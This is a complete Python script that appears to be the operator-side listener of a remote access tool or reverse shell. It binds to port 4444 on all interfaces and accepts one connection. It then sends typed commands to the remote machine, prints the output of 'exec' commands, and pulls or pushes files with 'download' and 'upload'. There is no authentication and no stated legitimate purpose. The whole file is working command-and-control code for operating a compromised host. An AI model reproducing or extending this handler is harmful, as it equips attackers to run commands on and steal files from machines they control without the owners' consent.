import socket
import struct
import os

HOST = "0.0.0.0"
PORT = 4444
BUFFER = 4096


def send_data(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)


def recv_data(sock):
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = struct.unpack(">I", raw_len)[0]

    data = b""
    while len(data) < length:
        chunk = sock.recv(BUFFER)
        if not chunk:
            break
        data += chunk
    return data


def send_file(sock, path):
    if not os.path.exists(path):
        send_data(sock, b"ERROR")
        return

    send_data(sock, b"OK")
    with open(path, "rb") as f:
        send_data(sock, f.read())


def receive_file(sock, path):
    status = recv_data(sock)
    if status != b"OK":
        print("File not found on remote")
        return

    data = recv_data(sock)
    with open(path, "wb") as f:
        f.write(data)
    print("Downloaded:", path)


def main():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)

    print("Waiting for connection...")
    conn, addr = s.accept()
    print("Connected:", addr)

    while True:
        cmd = input(">> ")

        if cmd.strip() == "":
            continue

        send_data(conn, cmd.encode())

        parts = cmd.split()

        if parts[0] == "exit":
            break

        elif parts[0] == "exec":
            print(recv_data(conn).decode())

        elif parts[0] == "download":
            receive_file(conn, parts[2])

        elif parts[0] == "upload":
            send_file(conn, parts[1])

    conn.close()


if __name__ == "__main__":
    main()
